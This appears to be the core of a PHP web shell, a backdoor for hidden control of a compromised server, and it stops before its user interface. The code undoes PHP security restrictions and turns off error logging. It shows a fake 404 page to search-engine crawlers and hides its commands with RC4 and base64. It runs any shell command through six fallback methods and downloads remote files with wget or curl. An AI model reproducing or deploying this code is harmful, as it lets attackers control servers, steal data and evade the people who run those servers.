$loadTime = microtime(true);
$isWIN = DIRECTORY_SEPARATOR === '\\';
define('DS', DIRECTORY_SEPARATOR);
define('SROOT', dirname(__file__) . DS);

# Restoring
@ini_restore('safe_mode_include_dir');
@ini_restore('safe_mode_exec_dir');
@ini_restore('disable_functions');
@ini_restore('allow_url_fopen');
@ini_restore('safe_mode');
@ini_restore('open_basedir');
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('file_uploads', 1);
@ini_set('allow_url_fopen', 1);
@ini_alter('error_log', null);
@ini_alter('log_errors', 0);
@ini_alter('file_uploads', 1);
@ini_alter('allow_url_fopen', 1);

@error_reporting(7);
@ini_set('memory_limit', '64M'); //change it if phpzip fails
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);

$uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
    header('HTTP/1.0 404 Not Found');
    exit;
}

if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
	header("Content-Type: text/html; charset=$config[charset]");

function mHide($n, $v){
	return "<input id='$n' name='$n' type='hidden' value='$v' />";
}

function mLink($t, $o, $e = '', $m = true){
	if ($m) $o .= ';return false;';
	return "<a href='#' onclick='$o' $e>$t</a>";
}

function mInput($n, $v, $tt = '', $nl = '', $c = '', $e = ''){
	if ($tt !== '') $tt = "$tt<br>"; 
	if ($nl !== '')
		return "<p>$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e /></p>";
	else
		return "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
}

function mSubmit($v, $o, $nl = '', $e = ''){
	if ($nl !== '')
		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;' $e ></p>";
	else
		return "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
}

function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
	$tmp = '';
	if ($o) $o = "onchange='$o'";
	if ($t) $t = "$t<br>";
	if ($nk){
		foreach ($v as $value){
			if ($s == $value)
				$tmp .= "<option value='$value' selected='selected'>$value</option>";
			else 
				$tmp .= "<option value='$value'>$value</option>";
		}
	} else {
		foreach ($v as $key=>$value){
			if ($s == $value)
				$tmp .= "<option value='$key' selected='selected'>$value</option>";
			else 
				$tmp .= "<option value='$key'>$value</option>";
		}
	}
	$tmp = "$t<select class='theme' id='$n' name='$n' $o $e>$tmp</select>";
	if ($nl) $tmp = "<p>$tmp</p>";
	return $tmp;
}

function mCheck($n, $v, $o = '', $c = false){
	return "<input id='$n' name='$n' value='$v' type='checkbox' onclick='$o' " . ($c ? 'checked' : '') . "/>";
}

function fix_magic_quote($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	$quotes_sybase = (empty($quotes_sybase) || $quotes_sybase === 'off') ? false : true;
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		if(is_array($arr)){
			foreach($arr as $k => $v){
				if(is_array($v)) $arr[$k] = fix_magic_quote($v);
				else $arr[$k] = ($quotes_sybase ? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v)));
			}
		} else 
			$arr = stripslashes($arr);			
	}
	return $arr;
}

function rc4Init($pwd) {
	$key = array();
	$box = array();
	$pwd_length = strlen($pwd);
	
	for ($i = 0; $i < 256; $i++) {
		$key[$i] = ord($pwd[$i % $pwd_length]);
		$box[$i] = $i;
	}
	
	for ($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $key[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}
	
	return $box;
}

function rc4($data, $box) {
	$cipher = '';
	$data_length = strlen($data);
	
	for ($a = $j = $i = 0; $i < $data_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$cipher .= chr(ord($data[$i]) ^ $box[(($box[$a] + $box[$j]) % 256)]);
	}
	
	return $cipher;
}

function rc4encrypt($data, $box) {
	global $config;
	for ($i = 1; $i <= $config['rc4drop']; $i++)
		$data = chr(mt_rand(33, 122)) . $data;
	return rc4($data, rc4Init($box));
}

function rc4decrypt($data, $box) {
	global $config;
	return substr(rc4($data, rc4Init($box)), $config['rc4drop']);
}

function getData(){
	global $config;
	$p = '';
	if (isset($_POST[$config['consNames']['post']])) $p = fix_magic_quote($_POST[$config['consNames']['post']]);
	else if (isset($_GET[$config['consNames']['post']])) $p = fix_magic_quote($_GET[$config['consNames']['post']]);
	if (!empty($p)){
		$data = array();
		$p = rc4decrypt(base64_decode($p), $config['sPass']);
		foreach(explode('&', $p) as $tmp) {
			$tmp = explode('=', $tmp);
			if (!empty($tmp[0])){
				if (strpos($tmp[0], '[]') !== false) $data[str_replace('[]', '', $tmp[0])][] = rawurldecode($tmp[1]);
				else $data[$tmp[0]] = rawurldecode($tmp[1]);
			}
		}
		$p = $data;
	}
	return $p;
}

function getSelf(){
	return $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
}

function tText($id, $def){
	
	if (isset($lang[$id])) return $lang[$id];
	else return $def;
}

function showIcon($f){
	$image = 'unk';
	$f = strtolower(substr(strrchr($f, '.'), 1));
	$img = array('htaccess', 'asp', 'cgi', 'php', 'html', 'jpg', 'js', 'swf', 'txt',
	 'tar', 'mp3', 'avi', 'cmd', 'cpp', 'ini', 'doc', 'exe', 'log', 'pl', 'py', 'xml');

    $imgEquals = array(
      'tar' => array('tar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'zip', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'rar', 'uuf', '7z'), 
      'php' => array('php', 'php3', 'php4', 'php5', 'phtml', 'shtml'), 
      'jpg' => array('jpg', 'gif', 'png', 'jpeg', 'jfif', 'jpe', 'bmp', 'ico', 'tif', 'tiff'), 
      'html'=> array('html', 'htm'), 
      'avi' => array('avi', 'mov', 'mvi', 'mpg', 'mpeg', 'wmv', 'rm', 'mp4'), 
      'lnk' => array('lnk', 'url'), 
      'ini' => array('ini', 'css', 'inf'), 
      'doc' => array('doc', 'dot', 'wri', 'rtf', 'pdf'), 
      'js'  => array('js', 'vbs'), 
      'cmd' => array('cmd', 'bat', 'pif'), 
      'swf' => array('swf', 'fla'), 
      'mp3' => array('mp3', 'au', 'midi', 'mid'), 
      'htaccess' => array('htaccess', 'htpasswd', 'ht', 'hta', 'so') 
	);

	if (in_array($f, $img)) $image = $f;
	if ($image === 'unk'){
		foreach ($imgEquals as $k => $v){
			if (in_array($f, $v)){
				$image = $k;
				break;
			}
		}
	}

    return "<div class='image $image'></div>";
}

# General functions
function hsc($s){
	//return htmlspecialchars($s, 2|1);
	return htmlentities($s);
}

function fixRoute($s){
	return str_replace(array('/', '\\'), DS, $s);
}

function execute($c, $i = false){
    $v = '';
    $r = '';
	//$c = $c . ' 2>&1';
    $dis_func = explode(',', get_cfg_var('disable_functions'));

    if ($c){
        if (function_exists('exec') && !in_array('exec', $dis_func)){
            exec($c, $r);
            $r = implode("\n", $r);
			//$tmp = '';
			//if(!empty($r)) foreach($r as $line) $tmp .= $line;
			//$r = $tmp;
			$v = 'exec';
        } else if (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)){
            $r = @shell_exec($c);
			$v = 'shell_exec';
        } else if (function_exists('system') && !in_array('system', $dis_func)){
            @ob_start();
            @system($c);
            $r = @ob_get_contents();
            @ob_end_clean();
			$v = 'system';
        } else if (function_exists('passthru') && !in_array('passthru', $dis_func)){
            @ob_start();
            @passthru($c);
            $r = @ob_get_contents();
            @ob_end_clean();
			$v = 'passthru';
        } else if (function_exists('popen') && !in_array('popen', $dis_func)){
            $h = popen($c, 'r');
            if (is_rource($h)){	
                if (function_exists('fread') && function_exists('feof')){
                    while (!feof($h))
                        $r .= fread($h, 512);
                } else if (function_exists('fgets') && function_exists('feof')){
                    while (!feof($h))
                        $r .= fgets($h, 512);
                }
            }
            pclose($h);
			$v = 'popen';
        } else if (function_exists('proc_open') && !in_array('proc_open', $dis_func)){
            $ds = array(1 => array('pipe', 'w'));
            //$ds = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $h = @proc_open($c, $ds, $pipes);
            //$h = @proc_open($c, $ds, $pipes, getcwd(), array());
            if (is_rource($h)){
                if (function_exists('fread') && function_exists('feof')){
                    while (!feof($pipes[1]))
                        $r .= fread($pipes[1], 512);
                } else if (function_exists('fgets') && function_exists('feof')){
                    while (!feof($pipes[1]))
                        $r .= fgets($pipes[1], 512);
					/*while (!feof($pipes[2]))
                        $r .= fgets($pipes[2], 512);*/
                }
            }
            @proc_close($h);
			$v = 'proc_open';
        }
    }

	if ($i) $r = array(0 => $r, 1 => $v);
    return($r);
}

function safeStatus(){
    $safe_mode = @ini_get('safe_mode');
    if (!$safe_mode && strpos(execute('echo abcdef'), 'def') != 3) $safe_mode = true;
    return $safe_mode;
}

function getcfg($n){
    $result = get_cfg_var($n);
    if ($result == 0) return tText('no', 'no');
    else if ($result == 1) return tText('yes', 'yes');
    else return $result;
}

function read_file($file){
	$content = false;
	if($fh = @fopen($file, 'rb')){
		$content = '';
		while(!feof($fh))
			$content .= fread($fh, 8192);
	}
	return $content;
}

function sizecount($s){
	if ($s[0] === '*') return $s;
	$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
	return @round( $s / pow(1024, ($i = floor(log($s, 1024)))), 2) . $sizename[$i];
}

function getPath($s, $n){
    if ($n === '.') $n = $s;
    if (substr($n, -1) !== DS) $n = $n . DS;
    return $n;
}

function getUpPath($n){
    $pathdb = explode(DS, $n);
    $num = count($pathdb);
    if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
    $uppath = implode(DS, $pathdb) . DS;
    return $uppath;
}

function sAjax($i){
	global $config;
	exit(base64_encode(rc4encrypt($i, $config['sPass'])));
}

function sDialog($i){
    return "<br><div id='uires' class='uires'>$i</div><br>";
}

function sValid($v){
    return ((isset($v)) && ($v !== ''));
}

function zip($files, $archive){
	if(!extension_loaded('zip')) return false;
	$zip = new ZipArchive();
	if(!$zip->open($archive, 1)) return false;

	if(!is_array($files)) $files = array($files);
	foreach($files as $file){
		$file = str_replace(get_cwd(), '', $file);
		$file = str_replace('\\', '/', $file);
		if(is_dir($file)){
			$filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file), 1);
			foreach($filesIterator as $iterator){
				$iterator = str_replace('\\', '/', $iterator);
				if(in_array(substr($iterator, strrpos($iterator, '/')+1), array('.', '..'))) continue;
				if(is_dir($iterator)) $zip->addEmptyDir(str_replace($file.'/', '', $iterator.'/'));
				else if(is_file($iterator)) $zip->addFromString(str_replace($file.'/', '', $iterator), read_file($iterator));
			}
		} else if(is_file($file)) 
			$zip->addFromString(basename($file), read_file($file));
	}
	if($zip->getStatusString()!==false) return true;
	$zip->close();
}

//TODO: agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
//para poder usarlo con archivos enormes/poca memoria
# Based on PHPZip v1.2 by DSR!
class PHPZip {
    var $datasec = array();
    var $ctrl_dir = array();
    var $old_offset = 0;

    function Zipper($basedir, $filelist){
		$cdir = dirname($basedir . $filelist[0]) . DS;
		$cut = strlen($cdir);
		foreach ($filelist as $f){	
			$f = $basedir . $f;
			if (file_exists($f)){
				if (is_dir($f)) $sBuff = $this->GetFileList($f, $cut);
				else if (is_file($f)){
					$fd = fopen($f, 'r');
					$sBuff = @fread($fd, filesize($f));
					fclose($fd);
					$this->addFile($sBuff, substr($f, $cut));
				}
			}
        }
        $out = $this->file();
		
        return 1;
    }

    function GetFileList($dir, $cut){
        if (file_exists($dir)){			
            $h = opendir($dir);
            while ($f = readdir($h)){
                if (($f !== '.') && ($f !== '..')){
                    if (is_dir($dir . $f)) $this->GetFileList($dir . $f . DS, $cut);
                    else if (is_file($dir . $f)){
						$fd = fopen($dir . $f, 'r');
						$sBuff = @fread($fd, filesize($dir . $f));
						fclose($fd);
						$this->addFile($sBuff, substr($dir . $f, $cut));
                    }
                }
            }
            closedir($h);
        }
        return 1;
    }

    function unix2DosTime($t = 0){
        $ta = ($t == 0) ? getdate() : getdate($t);
        if ($ta['year'] < 1980) $ta = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
        return (($ta['year'] - 1980) << 25) | ($ta['mon'] << 21) | ($ta['mday'] << 16) | ($ta['hours'] << 11) | ($ta['minutes'] << 5) | ($ta['seconds'] >> 1);
    }
	
	function hex2bin($s){
		$bin = '';
		$i = 0;
		do {
			$bin .= chr(hexdec($s{$i}.$s{($i + 1)}));
			$i += 2;
		} while ($i < strlen($s));
		return $bin;
	}

    function addFile($data, $name, $time = 0){
		$packv0 = pack('v', 0);
        $dtime = dechex($this->unix2DosTime($time));
		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;

        // "local file header" segment
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len = strlen($zdata);
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $name;

        // "file data" segment
        $fr .= $zdata;

        // "data descriptor" segment
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len);

        // add this entry to array
        $this->datasec[] = $fr;

        // now add to central directory record
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00" . $hexdtime;
        $cdrec .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset += strlen($fr);
        $cdrec .= $name;

        // save to central directory
        $this->ctrl_dir[] = $cdrec;
    }

    function file(){
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
    }

    function output($file){
        $fp = fopen($file, 'w');
        fwrite($fp, $this->file());
        fclose($fp);
    }
}

function compress($type, $archive, $files){
	if(!is_array($files)) $files = array($files);
	if($type=='zip'){
		if(class_exists('ZipArchive'))
			if (zip($files, $archive)) return true;
		else {
			//TODO
		}
	} else if (($type=='tar')||($type=='targz')){
		$archive = basename($archive);
		$listsBasename = array_map('basename', $files);
		$lists = array_map('wrap_with_quotes', $listsBasename);

		if ($type=='tar') 
			execute('tar cf "'.$archive.'" '.implode(' ', $lists));
		else if ($type=='targz') 
			execute('tar czf "'.$archive.'" '.implode(' ', $lists));

		if (is_file($archive)) 
			return true;
	}
	return false;
}

function decompress($type, $archive, $path){
	$path = realpath($path).DS;
	if(is_dir($path)){
		chdir($path);
		if($type=='unzip'){
			if(class_exists('ZipArchive')){
				$zip = new ZipArchive();
				$target = $path.basename($archive,'.zip');
				if($zip->open($archive)){
					if(!is_dir($target)) mkdir($target);
					if($zip->extractTo($target)) return true;
					$zip->close();
				}
			} else {
				//TODO
			}
		} else if($type=='untar'){
			$target = basename($archive,'.tar');
			if(!is_dir($target)) mkdir($target);
			$before = count(get_all_files($target));
			execute('tar xf "'.basename($archive).'" -C "'.$target.'"');
			$after = count(get_all_files($target));
			if($before!=$after) return true;
		} else if($type=='untargz'){
			$target = '';
			if(strpos(strtolower($archive), '.tar.gz')!==false) $target = basename($archive,'.tar.gz');
			else if(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
			if(!is_dir($target)) mkdir($target);
			$before = count(get_all_files($target));
			execute('tar xzf "'.basename($archive).'" -C "'.$target.'"');
			$after = count(get_all_files($target));
			if($before!=$after) return true;
		}
	}
	return false;
}

function download($url ,$save){
	if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
	$filename = basename($url);

	if($sBuff = read_file($url)){
		if(is_file($save)) unlink($save);
		if(write_file($save, $sBuff))
			return true;
	}
	
	if (!$isWIN){
		$buff = execute('wget '.$url.' -O '.$save);
		if(is_file($save)) return true;
		$buff = execute('curl '.$url.' -o '.$save);
		if(is_file($save)) return true;
		$buff = execute('lwp-download '.$url.' '.$save);
		if(is_file($save)) return true;
		$buff = execute('lynx -source '.$url.' > '.$save);
		if(is_file($save)) return true;
	}

	return false;
}

function filesize64($file){
	$size = filesize($file);
	if ($size > 1610612736 or $size < -1){
		/*
		global $isWIN;
		$size = 0;
		if (!safeStatus()){
			$cmd = ($isWIN) ? "for %F in (\"$file\") do @echo %~zF" : "stat -c%s \"$file\"";
			execute($cmd, $output);
			ctype_digit($size = trim($output));
		}
	
		if ($isWIN && class_exists("COM")){
			try {
				$fsobj = new COM('Scripting.FileSystemObject');
				$f = $fsobj->GetFile(realpath($file));
				$size = $f->Size;
			} catch (Exception $e){}
		}
		
		$piece = 1073741824;
		$fp = @fopen($file, 'r');
		@fseek($fp, 0, SEEK_SET);
		while ($piece > 1){
			@fseek($fp, $piece, SEEK_CUR);
			if (@fgetc($fp) === false){
				@fseek($fp, -$piece, SEEK_CUR);
				$piece = (int)($piece / 2);
			} else {
				@fseek($fp, -1, SEEK_CUR);
				$size += $piece;
			}
		}

		while (@fgetc($fp) !== false)
			$size++;
			
		@fclose($file_pointer);
		*/
		$size = sprintf("%u", $size);
		$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
		$size = '* ' . @round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
	}
	
	return $size;
}

function genPaginator($c, $t = -1, $fm = true) {
	global $p;
	
	$l = 'dbexec(euc("' . (isset($p['code']) ? $p['code'] : '') . '") + "&pg=';
	if ($fm)
		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
	
	if ($t < 0)
		$t = $c + 1;
	
	$tmp = '<div class="paginator">';
	$i = 0;
	while($i < $t) {
		$i++;
		if ($i < $c)
			$tmp .= mLink($i, $l . $i . '")', 'class="prev"');
		else if ($i == $c)
			$tmp .= '<span class="current">' . $i . '</span>';
		else
			$tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
	}

	return $tmp . '</div>';
}


$sBuff = '';  	
$p = getData();


# Sections
